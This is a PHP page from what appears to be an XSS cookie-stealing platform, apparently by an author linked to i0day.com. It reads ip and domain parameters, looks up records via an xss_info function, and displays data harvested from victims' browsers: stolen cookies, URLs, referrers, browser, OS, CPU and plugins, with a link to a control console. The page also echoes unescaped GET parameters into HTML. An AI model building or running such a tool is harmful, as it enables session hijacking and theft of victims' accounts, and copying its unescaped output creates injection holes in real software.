<?php 
/**
 * @author: xiaoma
 * @blog  : www.i0day.com
 * @date  : 2014.10.11 10:3
 */
header("Content-type: text/html; charset=utf-8");
require_once '../config/mysql_conn.php';
require_once '../config/session.php';
require_once '../config/user_control.php';
$xss_res=new user_control();
$ip =$_GET['ip'];;
$domain =$_GET['domain'];
$cookie_res=$xss_res->xss_info($ip,$domain);

?>

<div class="pageContent">
	<div class="tabs" currentIndex="0" eventType="click">
		<div class="tabsHeader">
			<div class="tabsHeaderContent">
				<ul>
					
					<li><span>信息</span></li>
					<li><a href="other_tools_action.php?domain=<?=$domain?>&ip=<?=$ip?>" class="j-ajax"><span>控制台</span></a></li>
				</ul>
			</div>
		</div>
		<div class="tabsContent" style="height:515px;">
        
		<div class="pageContent sortDrag" selector="h1" layoutH="42">	
	<div class="panel collapse" minH="100" defH="150">
		<h1>信息</h1>
		<div>
            <p></p>
           <table class="list" width="100%"> <tbody>
		      <tr><td>标题：<?=$cookie_res['title']?></td></tr>
                <tr><td>域名：<?=base64_decode($cookie_res['domain'])?></td></tr>   
			<tr><td>URL：<?=$cookie_res['url']?></td></tr> 
            <tr><td>Refrerer：<?=$cookie_res['refrerer']?></td></tr> 
            <tr><td>Cookies：<?=$cookie_res['cookie']?></td></tr> 
             </tbody>
        </table>
		</div>
	</div>
    	<div class="panel collapse" minH="100" defH="100">
		<h1>客户端信息</h1>
		<div>
			<p>浏览器：<?=$cookie_res['browser']?></p></br>
			<p>语言：<?=$cookie_res['language']?></p></br>
			<p>操作系统：<?=$cookie_res['os']?></p></br>
            <p>常用插件：<?=$cookie_res['flash']?></p></br>
            <p>CPU：<?=$cookie_res['cpu']?></p></br>
            <p><?=$cookie_res['flash']?></p></br>
            <p>设备类型：<?=$cookie_res['device']?></p></br>
            <p>时间：<?=$cookie_res['datetime']?></p></br>
		</div>
	</div>
        	<div class="panel collapse" minH="100" defH="100">
		<h1>其它信息</h1>
		<div>
			<p>插件：<?=$cookie_res['getplugin']?></p>
		</div>
	</div>
    </div>
	<div></div>
	</div>



		</div>
		<div class="tabsFooter">
			<div class="tabsFooterContent"></div>
		</div>
	</div>
	
	<p>&nbsp;</p>
	
	
</div>